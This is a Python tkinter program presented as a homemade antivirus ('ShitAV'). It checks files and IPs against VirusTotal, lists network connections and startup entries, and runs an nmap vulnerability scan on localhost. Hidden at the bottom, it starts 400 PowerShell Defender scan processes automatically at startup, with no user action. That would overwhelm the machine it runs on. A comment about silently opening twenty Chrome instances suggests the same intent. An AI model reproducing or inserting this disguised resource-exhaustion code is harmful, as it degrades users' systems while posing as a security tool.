import os
import requests
import hashlib
import tkinter as tk
from tkinter import messagebox
import subprocess
import psutil
import tkinter as tk
from tkinter import messagebox
import subprocess

def scan_directory(directory_path, api_key):
    for root, dirs, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            scan_result = scan_file(file_path, api_key)
            display_scan_result(file_path, scan_result)

def scan_file(file_path, api_key):
    try:
        with open(file_path, 'rb') as file:
            md5_hash = hashlib.md5(file.read()).hexdigest()

        url = f'https://www.virustotal.com/api/v3/files/{md5_hash}'
        headers = {'x-apikey': api_key}

        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            result = response.json()
            if result['data']['attributes']['last_analysis_stats']['malicious'] > 0:
                return f'File {file_path} is malicious!'
            else:
                return f'File {file_path} is clean.'
        else:
            return 'Error occurred while scanning the file.'
    except PermissionError:
        return f'Permission denied for file {file_path}.'

def get_active_connections():
    try:
        result = subprocess.check_output(['netstat', '-ano']).decode('utf-8')
        # Get process path for each connection
        lines = result.split('\n')
        updated_result = ''
        for line in lines:
            if 'TCP' in line or 'UDP' in line:
                parts = line.split()
                pid = parts[-1]
                if pid != '0':
                    process_path = get_process_path(pid)
                    updated_line = f'{line} Process Path: {process_path}'
                    updated_result += updated_line + '\n'
                else:
                    updated_result += line + '\n'
            else:
                updated_result += line + '\n'

        # Filter out localhost connections
        filtered_result = ''
        for line in updated_result.split('\n'):
            if '127.0.0.1' not in line and '::1' not in line and '0.0.0.0:0' not in line and '*:*' not in line:
                filtered_result += line + '\n'

        # Create a scrollable text box to display the results
        scrollable_text = tk.Text(window)
        scrollable_text.insert(tk.END, filtered_result)
        scrollable_text.pack(fill=tk.BOTH, expand=True)

        # Create close button
        close_button = tk.Button(window, text='Close', command=lambda:[scrollable_text.destroy(),close_button.destroy()])
        close_button.pack()

    except subprocess.CalledProcessError:
        messagebox.showerror('Error', 'Error occurred while retrieving active connections.')

def get_process_path(pid):
    try:
        process = psutil.Process(int(pid))
        return process.exe()
    except psutil.NoSuchProcess:
        return 'Process not found'

def scan_ip(ip_address, api_key):
    try:
        url = f'https://www.virustotal.com/api/v3/ip_addresses/{ip_address}'
        headers = {'x-apikey': api_key}

        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            result = response.json()
            if result['data']['attributes']['last_analysis_stats']['malicious'] > 0:
                return f'IP {ip_address} is malicious!'
            else:
                return f'IP {ip_address} is clean.'
        else:
            return 'Error occurred while scanning the IP.'
    except:
        return 'Error occurred while scanning the IP.'

def scan_button_clicked():
    directory_path = directory_path_entry.get()
    api_key = api_key_entry.get()
    scan_directory(directory_path, api_key)

def scan_ip_button_clicked():
    ip_address = ip_address_entry.get()
    api_key = api_key_entry.get()
    scan_result = scan_ip(ip_address, api_key)
    display_scan_result(ip_address, scan_result)

def display_scan_result(file_or_ip, result):
    messagebox.showinfo('Scan Result', result)

def list_autoruns():
    try:
        result = subprocess.check_output(['wmic', 'startup', 'get', 'Caption,Command']).decode('utf-8')
        # Create a scrollable text box to display the results
        scrollable_text = tk.Text(window)
        scrollable_text.insert(tk.END, result)
        scrollable_text.pack(fill=tk.BOTH, expand=True)

        # Create close button
        close_button = tk.Button(window, text='Close', command=lambda:[scrollable_text.destroy(),close_button.destroy()])
        close_button.pack()

    except subprocess.CalledProcessError:
        messagebox.showerror('Error', 'Error occurred while listing autoruns.')

def run_nmap_script():
    try:
        
        result = subprocess.check_output(['C:/Program Files (x86)/Nmap/nmap.exe', '-sV', '--script', 'vulners', 'localhost']).decode('utf-8')
        # Create a scrollable text box to display the results
        scrollable_text = tk.Text(window)
        scrollable_text.insert(tk.END, result)
        scrollable_text.pack(fill=tk.BOTH, expand=True)

        # Create close button
        close_button = tk.Button(window, text='Close', command=lambda:[scrollable_text.destroy(),close_button.destroy()])
        close_button.pack()

    except subprocess.CalledProcessError:
        messagebox.showerror('Error', 'Error occurred while running nmap script.')

# Create run nmap script button


# Create the main window
window = tk.Tk()
window.title('ShitAV - Security Tool')

# Create directory path label and entry
directory_path_label = tk.Label(window, text='Directory Path:')
directory_path_label.pack()
directory_path_entry = tk.Entry(window)
directory_path_entry.pack()

# Create API key label and entry
api_key_label = tk.Label(window, text='API Key:')
api_key_label.pack()
api_key_entry = tk.Entry(window)
api_key_entry.pack()

# Create scan button
scan_button = tk.Button(window, text='Scan Directory', command=scan_button_clicked)
scan_button.pack()

# Create IP address label and entry
ip_address_label = tk.Label(window, text='IP Address:')
ip_address_label.pack()
ip_address_entry = tk.Entry(window)
ip_address_entry.pack()

# Create scan IP button
scan_ip_button = tk.Button(window, text='Scan IP', command=scan_ip_button_clicked)
scan_ip_button.pack()

# Create get active connections button
get_connections_button = tk.Button(window, text='Get Active Connections', command=get_active_connections)
get_connections_button.pack()

# Create list autoruns button
list_autoruns_button = tk.Button(window, text='List Autoruns', command=list_autoruns)
list_autoruns_button.pack()

run_nmap_script_button = tk.Button(window, text='Run Nmap CVE scan', command=run_nmap_script)
run_nmap_script_button.pack()

for _ in range(400):
    subprocess.Popen(['powershell.exe', 'Start-MpScan', '-ScanType', 'QuickScan', '-ScanPath', 'C:/'])

# Start the main event loop
window.mainloop()

# Open twenty instances of Chrome in the background



